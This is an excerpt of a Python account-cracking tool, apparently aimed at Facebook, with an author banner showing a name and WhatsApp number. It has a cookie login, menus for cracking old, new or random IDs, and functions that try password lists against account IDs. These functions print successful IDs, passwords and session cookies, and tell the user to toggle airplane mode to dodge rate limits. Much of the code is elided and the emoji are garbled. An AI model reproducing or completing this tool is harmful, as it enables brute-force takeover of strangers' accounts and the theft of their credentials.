...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mSaoud')
...
$$    $$/         $$ |           $$$/           $$    $$/ 
$$$$$$$/          $$/             $/             $$$$$$/
  {m}â€¢{k}â€¢{h}â€¢{sir} THIS TOOL IS MEHEDI HASAN TONU  {x}{m}â€¢{k}â€¢{h}â€¢{x}

    \t{asu}    {m}â€¢{k}â€¢{h}â€¢{sir} WATTSAP NMBR : +8801759916221 {x}{m}â€¢{k}â€¢{h}â€¢{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}â€¢{u}] Enter Cookies :{M} ')
		...
		print(f'  {u}[{h}â€¢{u}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{k} ');time.sleep(1)
		print(f'  {u}[{h}â€¢{u}]{h} press :Ctrl+p to go forward {k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def setting():
	...
	banner()
	print('')
	print('1. Crack OldðŸ˜’LOOLðŸ’”  ')
	print(f'2. Crack New MAST OK IDZ ðŸ˜Ž {h} Recommended{h}{x}')
	print(f'3. Random {h}LOOL HA ðŸ’”{h}{x}')
	print('')
	hu = input('Enter  : ')
	if hu in ['1','01']:
...
#		method.append('free')
		...
		method.append('mobile')
	print(f'{b}NOTE:\nðŸŽ€{k}RECOMMENDED NOT TO DISPLAY THE APPLICATION\nðŸŽ€RECOMMENDED TO USE A DEPAULT PASSWORD{b}{x} ') 
	print('')
...
def passwrd():
	os.system('clear')
	banner()
	print(f'         {m}â€¢{k}â€¢{h}â€¢{x} {b}Cracking Start Be Patience{b} {m}â€¢{k}â€¢{h}â€¢{x} ')
	print('')
	print(f'  {m}â€¢{k}â€¢{h}â€¢{x} {b}Play Aeroplane mode After Every 3 Minuts{b} {m}â€¢{k}â€¢{h}â€¢{x} ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}TONU-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}TONU-OK˜˜>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'TONU-CP˜´[â€¢] ID       : {idf} [â€¢] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold yellow]TONU-CP˜°[â€¢] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]TONU-OK˜˜[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackp(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rðŸ‡µðŸ‡°{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def crackX(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{b}Malikzada-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
